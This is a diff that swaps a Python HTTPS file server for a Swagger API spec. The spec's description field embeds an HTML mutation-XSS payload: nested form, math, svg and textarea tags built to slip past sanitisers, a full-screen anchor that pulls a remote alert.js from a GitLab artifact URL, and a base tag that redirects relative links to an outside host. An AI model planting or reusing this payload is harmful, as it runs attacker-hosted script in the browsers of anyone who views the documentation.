@@ -1,50 +1,20 @@
-import http.server
-import ssl
-import os
+swagger: '2.0'
+info:
+  title: Classic API Resource Documentation
+  description: |  
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><a href=https://gitlab.com/yvvdwf/_/-/jobs/552156057/artifacts/raw/alert.js data-type=script style='cursor: default;overflow: visible;width: 1000px;position: fixed;height: 2000px;margin: 0;display: block;box-sizing: initial;' data-remote=true class='atwho-view select2-drop-mask pika-select'><div style='width: 100vw;height: 100vh;position: fixed;'></div></a><base href='https://ec2.ap-east-1.amazonaws.com/XD/'>"></form>
 
-# Define server address and port
-HOST = "localhost"
-PORT = 8443
-
-# Custom handler to add CORS headers
-class CORSHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
-    def end_headers(self):
-        # Add CORS headers
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', '*')
-        # Call the parent class's end_headers to complete the response
-        super().end_headers()
-
-    def do_OPTIONS(self):
-        # Handle preflight CORS requests
-        self.send_response(200)
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', '*')
-        self.end_headers()
-
-# Set up the server to serve files from the current directory
-server = http.server.HTTPServer((HOST, PORT), CORSHTTPRequestHandler)
-
-# Path to SSL certificate and key
-cert_file = "server.crt"
-key_file = "server.key"
-
-# Ensure certificate and key files exist
-if not os.path.exists(cert_file) or not os.path.exists(key_file):
-    print(f"Error: {cert_file} or {key_file} not found.")
-    exit(1)
-
-# Wrap the server with SSL
-context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-context.load_cert_chain(certfile=cert_file, keyfile=key_file)
-
-server.socket = context.wrap_socket(server.socket, server_side=True)
-
-print(f"Serving files from {os.getcwd()} at https://{HOST}:{PORT}")
-try:
-    server.serve_forever()
-except KeyboardInterrupt:
-    print("\nServer stopped.")
-    server.server_close()
+  version: production
+basePath: /
+security:
+  - basicAuth: []
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
